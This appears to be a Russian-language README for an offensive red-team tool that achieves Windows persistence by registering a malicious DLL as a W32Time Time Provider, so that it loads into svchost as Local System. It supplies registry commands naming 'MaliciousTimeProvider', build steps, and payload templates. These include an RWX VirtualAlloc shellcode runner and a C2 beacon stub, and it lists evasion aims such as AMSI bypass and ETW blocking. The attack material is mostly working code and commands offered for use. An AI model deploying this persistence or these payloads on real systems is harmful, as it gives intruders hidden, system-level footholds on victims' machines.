# TimeProvider Persistence (T1543.003)

Инструмент Red Team для реализации техники persistence через Windows Time Provider.

## Обзор техники

Эта техника эксплуатирует механизм persistence Windows Time Service (W32Time) путем регистрации вредоносной DLL в качестве Time Provider. W32Time загружает все библиотеки, зарегистрированные в следующем ключе реестра:

```
HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders
```

DLL загружается в процесс svchost.exe от имени Local System, обеспечивая скрытный и надежный механизм persistence.

## Требования DLL

Сервис W32Time требует, чтобы DLL экспортировала следующие функции:

| Функция | Назначение |
|---------|-----------|
| `TimeProvOpen()` | Точка входа, вызываемая при инициализации провайдера |
| `TimeProvClose()` | Функция очистки |
| `TimeProvGetSamples()` | Получение временных отсчетов (samples) |
| `TimeProvSetConfig()` | Обработка конфигурации |

## Реализация

Файл `TimeGhost.cpp` предоставляет минимальную DLL без windows.h:

- Ручные typedef'ы для типовых Windows-типов (без полного заголовка)
- Экспорт необходимых функций интерфейса Time Provider
- `TimeProvOpen()` как основной точкой входа для выполнения payload
- Возврат `ERROR_SUCCESS` в качестве заглушки

## Использование

### Компиляция
```cmd
cl /LD /O2 /EHsc TimeGhost.cpp
```

### Развертывание persistence

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousTimeProvider" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousTimeProvider\DllName" /ve /d "C:\Path\To\DLLname" /f
reg add "HKLM\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\MaliciousTimeProvider\Enabled" /ve /d "1" /t REG_DWORD /f
```

### Интеграция payload

Замените заглушку в функции `TimeProvOpen()` на свой malicious код. Payload выполняется в svchost.exe с привилегиями Local System.

**Что такое payload?**
Payload представляет собой malicious код, который выполняется при загрузке DLL. В операциях Red Team это обычно включает:
- Выполнение shellcode (reflective loader, staged implants)
- DLL injection в другие процессы
- Fileless выполнение (CLR, WMI, WScript)
- Lateral movement (named pipes, SMB)
- Defense evasion (AMSI bypass, ETW blocking)

**Примеры payload:**

**MessageBox (тестирование):**
```cpp
DWORD WINAPI TimeProvOpen(...) {
    MessageBoxW(NULL, L"Payload executed", L"TimeProvider", MB_OK);
    return ERROR_SUCCESS;
}
```

**Выполнение shellcode:**
```cpp
DWORD WINAPI TimeProvOpen(...) {
    unsigned char shellcode[] = { /* ваш shellcode */ };
    void* exec = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    memcpy(exec, shellcode, sizeof(shellcode));
    ((void(*)())exec)();
    return ERROR_SUCCESS;
}
```

**C2 beacon:**
```cpp
DWORD WINAPI TimeProvOpen(...) {
    // Загрузка и выполнение C2 импланта (используйте свой C2 фреймворк)
    return ERROR_SUCCESS;
}
```

## Компиляция

### Требования
- Visual Studio 2022+ или Build Tools
- Windows SDK 10.0.22621+

### Компиляция (Visual Studio Developer Command Prompt)
```cmd
cl /LD /O2 /EHsc TimeGhost.cpp
```

### Компиляция (x64 с указанием путей)
```cmd
"C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\[VERSION]\bin\Hostx64\x64\cl.exe" ^
/LD /O2 /EHsc ^
/I"C:\Program Files (x86)\Windows Kits\10\Include\[VERSION]\um" ^
/I"C:\Program Files (x86)\Windows Kits\10\Include\[VERSION]\ucrt" ^
/I"C:\Program Files (x86)\Windows Kits\10\Include\[VERSION]\shared" ^
TimeGhost.cpp ^
/link /out:timeghost.dll ^
/libpath:"C:\Program Files (x86)\Windows Kits\10\Lib\[VERSION]\um\x64" ^
/libpath:"C:\Program Files (x86)\Windows Kits\10\Lib\[VERSION]\ucrt\x64"
```

Замените `[VERSION]` на установленную версию SDK/MSVC.

### Проверка экспортов
```cmd
dumpbin /exports timeghost.dll
```

Ожидаемый вывод:
```
TimeProvClose
TimeProvGetSamples
TimeProvOpen
TimeProvSetConfig
```

## Ссылки

- MITRE ATT&CK: T1543.003 (Windows Service)
- Windows Time Service: https://docs.microsoft.com/en-us/windows-server/networking/windows-time-service/windows-timeservice-tools-and-settings